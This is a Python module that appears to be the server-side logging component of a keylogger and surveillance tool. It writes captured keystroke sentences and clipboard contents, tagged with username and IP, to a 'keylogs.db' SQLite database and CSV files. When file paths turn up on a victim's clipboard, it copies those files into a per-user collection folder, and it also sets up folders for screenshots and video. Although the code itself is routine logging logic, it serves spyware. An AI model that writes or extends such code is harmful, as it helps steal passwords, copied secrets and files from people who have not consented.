import csv
from datetime import datetime
import os
import sqlite3
import shutil
from directory import setup_user_directories
from utils import get_username, get_ip

DB_FILE = "./db/keylogs.db"


def log_clipboard(data):
    last_clipboard_value = getattr(log_clipboard, "last_value", None)

    if data != last_clipboard_value:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        username = get_username()
        ip = get_ip()

        # Set up user directories
        user_dir, clipboard_dir, screenshot_dir, files_dir, video_dir = (
            setup_user_directories(username)
        )

        if isinstance(data, list):  # Check if data is a list of file paths
            for file_path in data:
                if os.path.isfile(file_path):
                    try:
                        dest_path = os.path.join(files_dir, os.path.basename(file_path))
                        shutil.copy(file_path, dest_path)  # Copy the file to server
                        log_entry = f"Clipboard: copy path: {file_path}, paste path: {dest_path}"

                        conn = sqlite3.connect(DB_FILE)
                        c = conn.cursor()
                        c.execute(
                            "INSERT INTO clipboard_logs (timestamp, username, ip, text) VALUES (?, ?, ?, ?)",
                            (timestamp, username, ip, log_entry),
                        )
                        conn.commit()
                        conn.close()

                        print(f"Clipboard logged: {log_entry}")
                    except Exception as e:
                        print(f"Error logging clipboard file: {e}")
                else:
                    print(f"File not found: {file_path}")

        else:
            log_entry = f"Clipboard: {data}"

            # Save clipboard text to CSV
            csv_file_path = os.path.join(clipboard_dir, "clipboard_logs.csv")
            file_exists = os.path.isfile(csv_file_path)

            try:
                with open(csv_file_path, mode="a", newline="") as csv_file:
                    csv_writer = csv.writer(csv_file)
                    if not file_exists:
                        csv_writer.writerow(
                            ["Timestamp", "Username", "IP", "Data"]
                        )  # Write headers
                    csv_writer.writerow([timestamp, username, ip, data])

                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                c.execute(
                    "INSERT INTO clipboard_logs (timestamp, username, ip, text) VALUES (?, ?, ?, ?)",
                    (timestamp, username, ip, log_entry),
                )
                conn.commit()
                conn.close()

                print(f"Clipboard logged: {log_entry}")
            except Exception as e:
                print(f"Error logging clipboard text: {e}")

        log_clipboard.last_value = data


def log_sentence(sentence):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    username = get_username()
    ip = get_ip()
    log_entry = sentence

    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        "INSERT INTO logs (timestamp, username, ip, text) VALUES (?, ?, ?, ?)",
        (timestamp, username, ip, log_entry),
    )
    conn.commit()
    conn.close()

    print(f"Keystroke logged: {sentence}")
